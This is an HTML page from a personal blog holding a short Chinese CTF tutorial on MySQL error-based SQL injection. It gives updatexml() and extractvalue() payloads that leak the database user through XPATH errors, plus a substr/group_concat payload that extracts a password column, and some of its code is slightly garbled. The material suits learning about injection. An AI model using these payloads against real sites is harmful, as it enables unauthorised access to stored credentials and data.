@@ -1,0 +1,189 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>CTF WEB SQL-报错注入 | Xing-Fax</title>
+
+<link rel="shortcut icon" href="https://Xing-Fax.GitHub.io/favicon.ico?v=1699016659770">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://Xing-Fax.GitHub.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Xing-Fax
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699016659770" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CTF WEB SQL-报错注入
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-07-17 ·
+                    </time>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/php/" class="post-tags">
+                            # PHP
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/web/" class="post-tags">
+                            # WEB
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/ctf/" class="post-tags">
+                            # CTF
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="sql-报错注入">SQL-报错注入</h1>
+<!-- more -->
+<p>报错注入在没办法使用union联合查询的时候使用，前提是不能过滤一些关键的函数</p>
+<h2 id="updatexml">Updatexml()</h2>
+<pre><code class="language-sql">select * from users where username='admin' and updatexml(1,concat(0x7e,(select ()user)),0x7e),1);
+</code></pre>
+<pre><code>//回显
+ERROR 1105(HY000): XPATH syntax error: '~root@localhost~'
+</code></pre>
+<p>可以看到，select uaer() 被成功查询，并将结果展示在了报错信息中，在MySQL中可以使用十六进制表示对应的字符串</p>
+<h2 id="extractvalue">Extractvalue()</h2>
+<pre><code>extractvalue(1,concat(0x7e,(select user()),0x7e))
+</code></pre>
+<blockquote>
+<p>与updatexml()利用方法类似</p>
+</blockquote>
+<h2 id="截取回显">截取回显</h2>
+<p>报错信息回显通常会有字符限制，长度超出的部分被丢去，我们可以使用substr函数进行一个截取，如下</p>
+<pre><code>extractvalue(0x0a,concat(0x0a,(select substr((select group_concat(card_passwd) from teacher),20))))%23
+</code></pre>
+<blockquote>
+<p>%23为URL编码中的#号</p>
+</blockquote>
+<h2 id="sqlmap">sqlmap</h2>
+<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5CThread%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1690785114523.png" alt="1690785114523" loading="lazy"></figure>
+<p>待更新...</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://Xing-Fax.GitHub.io/post/jointinjec/" class="post-title gt-a-link">
+                    CTF WEB SQL注入-联合注入
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温故而知新，可以为师矣~</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Website BY <a href="https://github.com/Xing-Fax/" target="_blank">Xing-Fax</a> Powered BY <a
+                href="https://github.com/Xing-Fax/xing-fax.github.io/" target="_blank">GitHub | <a href="https://xing-fax.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
